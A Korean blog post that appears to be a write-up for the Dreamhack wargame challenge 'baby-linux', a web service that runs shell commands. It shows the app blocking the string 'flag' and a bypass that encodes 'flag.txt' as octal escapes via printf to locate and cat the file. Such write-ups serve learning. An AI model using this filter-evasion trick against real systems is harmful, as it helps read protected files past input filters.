---
layout: post
category: [wargame, misc]
title: baby-linux
---

## [문제](https://dreamhack.io/wargame/challenges/837)
리눅스 명령어를 실행하는 웹 서비스에서 flag.txt 를 찾아 플래그를 획득하면 된다.

## 문제 분석

처음에 무작정 웹사이트에서 루트 디렉토리에서부터 ``flag.txt`` 를 찾는 명령어를 입력해보았다.

```sh
find / | grep flag.txt
```

![NO](/assets/img/2024-05-17-baby-linux/no.png)   

``No!`` 라는 메시지가 떴다.

아마도 ``flag`` 라는 문자열을 필터링하고 있는 것 같다.

```py
# app.py 에서 flag 문자열을 필터링하고 있다.
if 'flag' in cmd:
    return render_template('index.html', result='No!')
```

## 풀이
``regex`` 를 이용하여도 될 것 같지만.. 조금 더 원시적인 방법으로 해결하였다(?)

```sh
find / | grep $(printf '%b%b%b%b%b%b%b%b' '\146' '\154' '\141' '\147' '\56' '\164' '\170' '\164')
```

``flag.txt`` 를 ``printf`` 를 이용하여 ``ASCII`` 코드로 변환하여 입력하였다.

![full path](/assets/img/2024-05-17-baby-linux/full-path.png)   

``/flag.txt`` 의 경로를 확인할 수 있었다.

이후 ``cat`` 명령어를 사용하여 플래그를 획득하였다.

```sh
cat /app/dream/hack/hello/$(printf '%b%b%b%b%b%b%b%b' '\146' '\154' '\141' '\147' '\56' '\164' '\170' '\164')
```

![FLAG](/assets/img/2024-05-17-baby-linux/flag.png)